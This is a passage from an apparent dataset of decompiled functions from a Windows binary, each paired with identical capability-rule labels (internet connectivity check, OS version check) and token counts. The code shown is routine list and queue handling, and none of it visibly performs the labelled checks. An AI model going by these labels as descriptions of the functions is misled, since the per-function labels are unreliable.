var_8h == 0);\n    return var_8h;\n}\n",
        "token_count": 813
    },
    "0006a200": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0006a200(uint noname_0, int32_t arg_ch)\n\n{\n    uint var_4h;\n    \n    if (arg_ch != 0) {\n        fcn.00076a80(*(arg_ch + -0xc), arg_ch + -0xc);\n    }\n    return;\n}\n",
        "token_count": 71
    },
    "0006a230": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0006a230(int32_t arg_8h, char *arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint *puVar3;\n    uint var_20h;\n    uint var_18h;\n    char *var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    char *var_4h;\n    \n    if (arg_ch == NULL) {\n        uVar2 = 0;\n    }\n    else {\n        var_4h = arg_ch;\n        while (*var_4h != '\\0') {\n            var_14h = var_4h;\n            do {\n                cVar1 = *var_14h;\n                var_14h = var_14h + 1;\n                var_4h = var_14h;\n            } while (cVar1 != '\\0');\n        }\n        puVar3 = fcn.000356c0(var_4h + (0x15 - arg_ch));\n        if (puVar3 == NULL) {\n            uVar2 = 0x21590004;\n        }\n        else {\n            fcn.00078be8(puVar3 + 5, arg_ch, var_4h + (1 - arg_ch));\n            puVar3[1] = 0;\n            puVar3[4] = arg_10h;\n            fcn.00034a10(arg_8h + 0x44);\n            *puVar3 = *(arg_8h + 0x40);\n            *(arg_8h + 0x40) = puVar3;\n            fcn.00034a80(arg_8h + 0x44);\n            uVar2 = 0;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 401
    },
    "0006a320": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0006a320(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, uint arg_18h)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_10h == 0) {\n        uVar1 = 0;\n    }\n    else if ((arg_ch == 0xf) && (arg_14h == 0xc)) {\n        uVar1 = fcn.0006c0a0(arg_8h, arg_10h);\n    }\n    else {\n        puVar2 = fcn.000356c0(arg_14h + 0x14);\n        if (puVar2 == NULL) {\n            uVar1 = 0x21590004;\n        }\n        else {\n            fcn.00078be8(puVar2 + 5, arg_10h, arg_14h);\n            puVar2[1] = 1;\n            puVar2[2] = arg_ch;\n            puVar2[3] = arg_14h;\n            puVar2[4] = arg_18h;\n            fcn.00034a10(arg_8h + 0x44);\n            *puVar2 = *(arg_8h + 0x40);\n            *(arg_8h + 0x40) = puVar2;\n            fcn.00034a80(arg_8h + 0x44);\n            uVar1 = 0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 362
    },
    "0006a3f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0006a3f0(int32_t arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    uint uVar1;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint *var_8h;\n    uint *var_4h;\n    \n    var_4h = fcn.000356c0(0x14);\n    if (var_4h == NULL) {\n        var_10h = 0x21590004;\n    }\n    else {\n        *var_4h = 0;\n        var_4h[1] = 0;\n        var_4h[2] = 0;\n        var_4h[3] = 0;\n        var_4h[4] = 0;\n        var_10h = fcn.0006a670(arg_8h, var_4h + 2, &var_ch);\n        if (var_10h == 0) {\n            fcn.00037100(arg_8h + 0x1c);\n            do {\n                uVar1 = fcn.00078a6e();\n                var_4h[1] = uVar1;\n                for (var_8h = *(arg_8h + 0x18); (var_8h != NULL && (var_4h[1] != var_8h[1])); var_8h = *var_8h) {\n                }\n            } while (var_8h != NULL);\n            *var_4h = *(arg_8h + 0x18);\n            *(arg_8h + 0x18) = var_4h;\n            *arg_ch = var_4h[2];\n            *arg_10h = var_4h[1];\n            fcn.00037190(arg_8h + 0x1c);\n            if (var_ch == 0) {\n                var_10h = 0;\n            }\n            else {\n                var_10h = fcn.00076560(*arg_ch, 0);\n                if (var_10h != 0) {\n                    fcn.0006a5a0(arg_8h, *arg_10h, 0);\n                    *arg_ch = 0;\n                    *arg_10h = 0;\n                }\n            }\n        }\n        else {\n            fcn.000357f0(var_4h);\n        }\n    }\n    return var_10h;\n}\n",
        "token_count": 549
    },
    "0006a530": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0006a530(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint var_8h;\n    uint *var_4h;\n    \n    var_8h = 0;\n    fcn.00036f70(arg_8h + 0x1c);\n    for (var_4h = *(arg_8h + 0x18); (var_4h != NULL && (var_4h[1] != arg_ch)); var_4h = *var_4h) {\n    }\n    if (var_4h != NULL) {\n        var_8h = var_4h[2];\n    }\n    fcn.00037020(arg_8h + 0x1c);\n    return var_8h;\n}\n",
        "token_count": 175
    },
    "0006a5a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0006a5a0(int32_t arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    uint *var_ch;\n    uint *var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    fcn.00037100(arg_8h + 0x1c);\n    var_8h = NULL;\n    for (var_ch = *(arg_8h + 0x18); (var_ch != NULL && (var_ch[1] != arg_ch)); var_ch = *var_ch) {\n        var_8h = var_ch;\n    }\n    if (var_ch != NULL) {\n        if (var_8h == NULL) {\n            *(arg_8h + 0x18) = *var_ch;\n        }\n        else {\n            *var_8h = *var_ch;\n        }\n        if (var_ch[3] != 0) {\n            fcn.00076a80(var_ch[2], var_ch[3]);\n        }\n        var_4h = var_ch[2];\n        fcn.000357f0(var_ch);\n    }\n    fcn.00037190(arg_8h + 0x1c);\n    if (var_4h != 0) {\n        fcn.0006a8c0(arg_8h, &var_4h, arg_10h);\n    }\n    return;\n}\n",
        "token_count": 319
    },
    "0006a670": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0006a670(int32_t arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t var_10h;\n    uint *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_10h != NULL) {\n        *arg_10h = 0;\n    }\n    fcn.00034a10(arg_8h + 0x44);\n    if (*(arg_8h + 0x15c) == 0) {\n        if (*(arg_8h + 0x154) == *(arg_8h + 0x158)) {\n            var_8h = *(arg_8h + 0x34);\n            var_4h = 0;\n            var_10h = fcn.00075eb0(arg_ch, &var_8h, 0, 0, *(arg_8h + 0x30), *(arg_8h + 0x38), *(arg_8h + 0x3c));\n            if (var_10h == 0) {\n                for (var_ch = *(arg_8h + 0x40); var_ch != NULL; var_ch = *var_ch) {\n                    if (var_ch[1] == 0) {\n                        var_10h = fcn.000766e0(*arg_ch, var_ch + 5, var_ch[4]);\n                        if (var_10h != 0) {\n                            fcn.000761d0(arg_ch, 0);\n                            goto code_r0x0006a86d;\n                        }\n                    }\n                    else {\n                        fcn.00076b10(*arg_ch, var_ch[2], var_ch + 5, var_ch[3], var_ch[4]);\n                    }\n                }\n                var_10h = 0;\n            }\ncode_r0x0006a86d:\n            fcn.00034a80(arg_8h + 0x44);\n            if (var_10h == 0) {\n                if (arg_10h == NULL) {\n                    var_10h = fcn.00076560(*arg_ch, 0);\n                    if (var_10h != 0) {\n                        fcn.000761d0(arg_ch, 0);\n                    }\n                }\n                else {\n                    *arg_10h = 1;\n                }\n            }\n        }\n        else {\n            uVar1 = *(arg_8h + 0x158) & 0x8000001f;\n            if (uVar1 < 0) {\n                uVar1 = (uVar1 - 1 | 0xffffffe0) + 1;\n            }\n            *(arg_8h + 0x158) = uVar1;\n            *arg_ch = *(arg_8h + 0x54 + *(arg_8h + 0x158) * 8);\n            *(arg_8h + 0x54 + *(arg_8h + 0x158) * 8) = 0;\n            *(arg_8h + 0x58 + *(arg_8h + 0x158) * 8) = 0xffffffff;\n            uVar1 = *(arg_8h + 0x158) + 1U & 0x8000001f;\n            if (uVar1 < 0) {\n                uVar1 = (uVar1 - 1 | 0xffffffe0) + 1;\n            }\n            *(arg_8h + 0x158) = uVar1;\n            fcn.00034a80(arg_8h + 0x44);\n            var_10h = 0;\n        }\n    }\n    else {\n        if (*(arg_8h + 0x164) == 0) {\n            if (*(arg_8h + 0x160) == 0) {\n                var_10h = 0x21590003;\n            }\n            else {\n                *arg_ch = *(arg_8h + 0x160);\n                *(arg_8h + 0x164) = 1;\n                var_10h = 0;\n            }\n        }\n        else {\n            var_10h = 0x21590064;\n        }\n        fcn.00034a80(arg_8h + 0x44);\n    }\n    return var_10h;\n}\n",
        "token_count": 977
    },
    "0006a8c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0006a8c0(int32_t arg_8h, uint *arg_ch, int32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint var_4h;\n    \n    if (arg_10h == 0) {\n        fcn.000761d0(arg_ch, 0);\n        if (*(arg_8h + 0x15c) != 0) {\n            *(arg_8h + 0x160) = 0;\n            *(arg_8h + 0x164) = 0;\n        }\n    }\n    else {\n        fcn.00034a10(arg_8h + 0x44);\n        if (*(arg_8h + 0x15c) == 0) {\n            uVar1 = *(arg_8h + 0x154) + 1U & 0x8000001f;\n            if (uVar1 < 0) {\n                uVar1 = (uVar1 - 1 | 0xffffffe0) + 1;\n            }\n            if (uVar1 == *(arg_8h + 0x158)) {\n                fcn.000761d0(arg_ch, 0);\n            }\n            else {\n                *(arg_8h + 0x54 + *(arg_8h + 0x154) * 8) = *arg_ch;\n                uVar2 = fcn.00026ff0();\n                *(arg_8h + 0x58 + *(arg_8h + 0x154) * 8) = uVar2;\n                *(arg_8h + 0x154) = uVar1;\n                *arg_ch = 0;\n            }\n        }\n        else {\n            *(arg_8h + 0x164) = 0;\n            *arg_ch = 0;\n        }\n        fcn.00034a80(arg_8h + 0x44);\n    }\n    return;\n}\n",
        "token_count": 440
    },
    "0006ab00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0006ab00(int32_t arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint *var_8h;\n    uint var_4h;\n    \n    fcn.00036f70(arg_8h + 0x1c);\n    for (var_8h = *(arg_8h + 0x18); (var_8h != NULL && (var_8h[1] != arg_ch)); var_8h = *var_8h) {\n    }\n    if (var_8h != NULL) {\n        var_8h[3] = arg_10h;\n        var_8h[4] = arg_14h;\n    }\n    fcn.00037020(arg_8h + 0x1c);\n    return var_8h != NULL;\n}\n",
        "token_count": 195
    },
    "0006ab80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0006ab80(int32_t arg_8h, int32_t arg_ch, uint *arg_10h, uint *arg_14h, uint *arg_18h)\n\n{\n    bool bVar1;\n    uint var_8h;\n    uint *var_4h;\n    \n    bVar1 = false;\n    fcn.00036f70(arg_8h + 0x1c);\n    for (var_4h = *(arg_8h + 0x18); (var_4h != NULL && (var_4h[1] != arg_ch)); var_4h = *var_4h) {\n    }\n    if (var_4h != NULL) {\n        *arg_10h = var_4h[3];\n        *arg_14h = var_4h[4];\n        *arg_18h = var_4h[2];\n        bVar1 = var_4h[3] != 0;\n        var_4h[3] = 0;\n        var_4h[4] = 0;\n    }\n    fcn.00037020(arg_8h + 0x1c);\n    return bVar1;\n}\n",
        "token_count": 268
    },
    "0006ac20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0006ac20(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint32_t arg_18h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    arg_8h_00 = fcn.000356c0(0x150);\n    if (arg_8h_00 == 0) {\n        iVar1 = 0x21590004;\n    }\n    else {\n        fcn.00078bfa(arg_8h_00, 0, 0x150);\n        *(arg_8h_00 + 4) = 0x800aae20;\n        *(arg_8h_00 + 8) = 0x800aad40;\n        *(arg_8h_00 + 0xc) = 0x800aaf20;\n        *(arg_8h_00 + 0x10) = 0x800ab000;\n        var_ch = arg_ch;\n        var_8h = 0;\n        var_10h = (arg_18h & 1) != 0;\n        iVar1 = fcn.00075eb0(arg_8h_00 + 0x14, &var_ch, arg_10h, arg_14h, 0, 0, var_10h);\n        if (iVar1 == 0) {\n            fcn.000349b0(arg_8h_00 + 0x18);\n            fcn.000349b0(arg_8h_00 + 0x130);\n            for (var_4h = 0; var_4h < 0xb; var_4h = var_4h + 1) {\n                *(arg_8h_00 + 0x38 + var_4h * 0x18) = arg_8h_00;\n            }\n            *arg_8h = arg_8h_00;\n            iVar1 = 0;\n        }\n        else {\n            fcn.000357f0(arg_8h_00);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 520
    },
    "0006b070": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0006b070(int32_t arg_8h, int32_t arg_ch)\n\n{\n    if (arg_ch != 0) {\n        fcn.00076a80(*(*(arg_8h + 4) + 0xc), arg_ch + -0xc);\n    }\n    return;\n}\n",
        "token_count": 72
    },
    "0006b0a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0006b0a0(int32_t arg_8h, int32_t *arg_ch, uint32_t *arg_10h, uint arg_14h)\n\n{\n    uint *puVar1;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if (*(*(*(arg_8h + 4) + 0x10) + 0x24) == 0) {\n        if (*(arg_8h + 8) == 0) {\n            var_4h = 0x21590001;\n        }\n        else if (*(arg_8h + 0x10) == 0) {\n            while (var_4h = fcn.00076860(*(*(arg_8h + 4) + 0xc), arg_ch, arg_10h, arg_14h, 1),  var_4h == 0) {\n                if (*arg_10h < 0xc) {\n                    fcn.00076a80(*(*(arg_8h + 4) + 0xc), *arg_ch);\n                    *arg_ch = 0;\n                    *arg_10h = 0;\n                    *(arg_8h + 0x10) = 1;\n                    *(arg_8h + 0x14) = 0x2159000a;\n                    return *(arg_8h + 0x14);\n                }\n                puVar1 = *arg_ch;\n                var_10h = *puVar1;\n                var_ch = puVar1[1];\n                var_8h = puVar1[2];\n                fcn.000270a0(&var_10h);\n                if (var_8h != '\\x06') {\n                    if (var_8h != '\\x03') {\n                        fcn.00076a80(*(*(arg_8h + 4) + 0xc), *arg_ch);\n                        *arg_ch = 0;\n                        *arg_10h = 0;\n                        if (var_8h == '\\x04') {\n                            *(arg_8h + 0x10) = 1;\n                            *(arg_8h + 0x14) = 0x21590006;\n                        }\n                        else {\n                            *(arg_8h + 0x10) = 1;\n                            *(arg_8h + 0x14) = 0x2159000a;\n                        }\n                        return *(arg_8h + 0x14);\n                    }\n                    *arg_10h = *arg_10h - 0xc;\n                    if (*arg_10h < 1) {\n                        fcn.00076a80(*(*(arg_8h + 4) + 0xc), *arg_ch);\n                        *arg_ch = 0;\n                        *arg_10h = 0;\n                    }\n                    else {\n                        *arg_ch = *arg_ch + 0xc;\n                    }\n                    return 0;\n                }\n                var_10h = *(*(arg_8h + 4) + 0xc);\n                fcn.00076a80(var_10h, *arg_ch);\n            }\n            if (var_4h == 0x21590003) {\n                var_4h = 0x21590006;\n            }\n            if (var_4h != 0x21590002) {\n                *(arg_8h + 0x10) = 1;\n                *(arg_8h + 0x14) = var_4h;\n            }\n        }\n        else {\n            var_4h = *(arg_8h + 0x14);\n        }\n    }\n    else {\n        var_4h = 0x21590006;\n    }\n    return var_4h;\n}\n",
        "token_count": 878
    },
    "0006b2e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0006b2e0(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint *var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_10h = arg_8h;\n    var_ch = 0;\n    if ((*(arg_8h[4] + 0x138) != 0) &&\n       (var_18h = (**(arg_8h[4] + 0x138))(*(arg_8h[4] + 0x20), arg_8h + 5),  var_18h != 0)) {\n        *var_10h = 3;\n        if (*(var_10h[4] + 0x134) != 0) {\n            (**(var_10h[4] + 0x134))(var_10h[5], var_18h, 4);\n        }\n        return 0;\n    }\n    var_10h[3] = 0;\n    do {\n        if (var_10h[3] == 0) {\n            while( true ) {\n                *var_10h = 1;\n                fcn.00034a10(var_10h[4] + 0x18);\n                if (*(var_10h[4] + 0x24) != 0) break;\n                var_18h = fcn.000762e0(*(var_10h[4] + 0x14), var_10h + 3, 0);\n                var_ch = var_10h[4] + 0x18;\n                fcn.00034a80(var_ch);\n                if (var_18h == 0) goto code_r0x0006b440;\n                *var_10h = 3;\n                if ((*(var_10h[4] + 0x24) == 0) && (*(var_10h[4] + 0x134) != 0)) {\n                    (**(var_10h[4] + 0x134))(var_10h[5], var_18h, 0);\n                }\n                if (*(var_10h[4] + 0x24) != 0) goto code_r0x0006b440;\n                var_10h = 0xa;\n                var_14h = 0x6b437;\n                fcn.00043cb0(10);\n            }\n            var_ch = var_10h[4] + 0x18;\n            fcn.00034a80(var_ch);\ncode_r0x0006b440:\n            if (*(var_10h[4] + 0x24) != 0) {\n                var_10h = NULL;\n                var_14h = 0xc;\n                var_18h = 0x6b45a;\n                fcn.000761d0(0xc, 0);\n                if (*(*(var_10h + 0x10) + 0x13c) == 0) {\n                    return 0;\n                }\n                var_18h = *(var_10h + 0x14);\n                var_1ch = *(*(var_10h + 0x10) + 0x20);\n                var_20h = 0x6b617;\n                (**(*(var_10h + 0x10) + 0x13c))();\n                return 0;\n            }\n            var_20h = var_10h[4] + 0x130;\n            var_14h = 0x6b470;\n            fcn.00034a10(var_20h);\n            *var_10h = 2;\n            var_14h = 0;\n            var_ch = 0;\n            var_4h = -1;\n            for (var_8h = 0; var_8h < 0xb; var_8h = var_8h + 1) {\n                if (*(var_10h[4] + 0x28 + var_8h * 0x18) == 1) {\n                    var_ch = var_ch + 1;\n                }\n                else if ((*(var_10h[4] + 0x28 + var_8h * 0x18) == 0) && (var_14h = var_14h + 1,  var_4h == -1)) {\n                    var_4h = var_8h;\n                }\n            }\n            if ((var_ch == 0) && (var_4h != -1)) {\n                var_14h = 0;\n                var_18h = var_10h[4] + 0x28 + var_4h * 0x18;\n                var_1ch = 0x800ab2e0;\n                var_20h = var_10h[4] + 0x2c + var_4h * 0x18;\n                var_24h = 0x6b528;\n                iVar1 = fcn.0001ace0(var_20h, 0x800ab2e0, var_18h);\n                if (iVar1 == 0) {\n                    *(var_10h[4] + 0x28 + var_4h * 0x18) = 1;\n                    var_ch = var_ch + 1;\n                }\n            }\n            var_24h = var_10h[4] + 0x130;\n            fcn.00034a80(var_24h);\n        }\n        if (var_ch == 0) {\n            var_1ch = CONCAT31(var_1ch._1_3_, 5);\n            var_20h = 0x21590007;\n            fcn.000270a0(&fcn.0006b2e0::var_24h);\n            fcn.000767a0(var_10h[3], &fcn.0006b2e0::var_24h, 0xc, 0);\n            fcn.000761d0(var_10h + 3, 0);\n            if (*(var_10h[4] + 0x134) != 0) {\n                (**(var_10h[4] + 0x134))(var_10h[5], 0x21590007, 3);\n            }\n        }\n        else {\n            var_18h = fcn.0006b620(var_10h);\n            if (var_18h != 0) {\n                fcn.000761d0(var_10h + 3, 0);\n            }\n        }\n    } while( true );\n}\n",
        "token_count": 1641
    },
    "0006b620": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0006b620(int32_t arg_8h)\n\n{\n    uint *var_120h;\n    uint var_11ch;\n    int32_t var_118h;\n    uint var_114h;\n    int32_t var_110h;\n    uint32_t var_10ch;\n    uint var_108h;\n    int32_t var_104h;\n    uint var_100h;\n    uint var_fch;\n    uint *var_4ch;\n    int32_t *var_48h;\n    uint var_44h;\n    uint *var_40h;\n    uint var_38h;\n    uint *var_34h;\n    uint *var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0;\n    var_38h = 0;\n    var_8h = 0;\n    fcn.00078bfa(&var_108h, 0, 0xcc);\n    var_108h = 0x800b924c;\n    var_110h = fcn.00076860(*(arg_8h + 0xc), &var_120h, &var_10ch, 600000, 0);\n    if (var_110h == 0) {\n        if (var_10ch < 0xc) {\n            var_110h = 0x2159000a;\n            if ((*(*(arg_8h + 0x10) + 0x24) == 0) && (*(*(arg_8h + 0x10) + 0x134) != 0)) {\n                (**(*(arg_8h + 0x10) + 0x134))(*(arg_8h + 0x14), 0x2159000a, 5);\n            }\n        }\n        else {\n            var_11ch = *var_120h;\n            var_118h = var_120h[1];\n            var_114h = var_120h[2];\n            fcn.000270a0(&var_11ch);\n            if ((var_114h == '\\0') || (var_114h == '\\x01')) {\n                var_104h = arg_8h;\n                var_fch = var_11ch;\n                if (var_114h != '\\x01') {\n                    var_100h = 1;\n                }\n                var_40h = var_120h;\n                if (*(*(arg_8h + 0x10) + 0x148) == 0) {\n                    var_110h = fcn.00076b10(*(arg_8h + 0xc), 9, 0, 0, 0);\n                    if (var_110h == 0) {\n                        var_8h = 1;\n                        var_4h = 0;\n                    }\n                    else {\n                        var_4h = var_110h;\n                        if (*(*(arg_8h + 0x10) + 0x14c) == 0) {\n                            var_8h = 0;\n                            var_4h = 0;\n                        }\n                    }\n                }\n                else {\n                    var_8h = 0;\n                    var_4h = 0;\n                }\n                if ((var_4h == 0) &&\n                   (var_4h = (**(*(arg_8h + 0x10) + 0x1c))\n                                       (&var_108h, var_118h, var_120h + 3, var_10ch - 0xc, &var_38h, &var_ch, \n                                        *(*(arg_8h + 0x10) + 0x20)),  var_8h != 0)) {\n                    var_110h = fcn.00076b10(*(arg_8h + 0xc), 10, 0, 0, 0);\n                }\n                do {\n                    var_110h = fcn.00076860(*(arg_8h + 0xc), &var_10h, &var_14h, 0, 0);\n                    if (var_110h != 0) break;\n                    fcn.00076a80(*(arg_8h + 0xc), var_10h);\n                } while (0 < var_14h);\n                if (var_110h == 0x21590002) {\n                    var_11ch = var_fch;\n                    var_118h = var_4h;\n                    var_114h = 2;\n                    fcn.000270a0(&var_11ch);\n                    var_28h = 0;\n                    var_24h = 0;\n                    var_18h = 0;\n                    var_2ch = 0xc;\n                    var_30h = &var_11ch;\n                    if (var_4ch == NULL) {\n                        var_34h = &var_24h;\n                    }\n                    else {\n                        var_34h = var_4ch;\n                        *var_48h = &var_24h;\n                    }\n                    var_1ch = var_ch;\n                    var_20h = var_38h;\n                    var_110h = fcn.00076cb0(*(arg_8h + 0xc), &var_34h, 0);\n                }\n                if (var_110h == 0x21590003) {\n                    var_110h = 0x21590006;\n                }\n                if (var_110h == 0) {\n                    if (*(*(arg_8h + 0x10) + 0x144) != 0) {\n                        (**(*(arg_8h + 0x10) + 0x144))(*(arg_8h + 0x14), var_44h, var_4h, var_38h, var_ch);\n                    }\n                }\n                else {\n                    if ((*(*(arg_8h + 0x10) + 0x24) == 0) && (*(*(arg_8h + 0x10) + 0x134) != 0)) {\n                        (**(*(arg_8h + 0x10) + 0x134))(*(arg_8h + 0x14), var_110h, 2);\n                    }\n                    if (*(*(arg_8h + 0x10) + 0x140) != 0) {\n                        (**(*(arg_8h + 0x10) + 0x140))(*(arg_8h + 0x14), var_44h, var_4h, var_38h, var_ch);\n                    }\n                }\n                fcn.0006bbe0(&var_108h);\n            }\n            else {\n                var_110h = 0x2159000a;\n                if ((*(*(arg_8h + 0x10) + 0x24) == 0) && (*(*(arg_8h + 0x10) + 0x134) != 0)) {\n                    (**(*(arg_8h + 0x10) + 0x134))(*(arg_8h + 0x14), 0x2159000a, 5);\n                }\n            }\n        }\n        fcn.000357f0(var_38h);\n        fcn.000357f0(var_44h);\n        if (*(arg_8h + 0xc) != 0) {\n            fcn.00076a80(*(arg_8h + 0xc), var_120h);\n        }\n    }\n    else if ((((var_110h != 0x21590003) && (var_110h != 0x21590002)) && (*(*(arg_8h + 0x10) + 0x24) == 0)) &&\n            (*(*(arg_8h + 0x10) + 0x134) != 0)) {\n        (**(*(arg_8h + 0x10) + 0x134))(*(arg_8h + 0x14), var_110h, 1);\n    }\n    return var_110h;\n}\n",
        "token_count": 1857
    },
    "0006bae0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
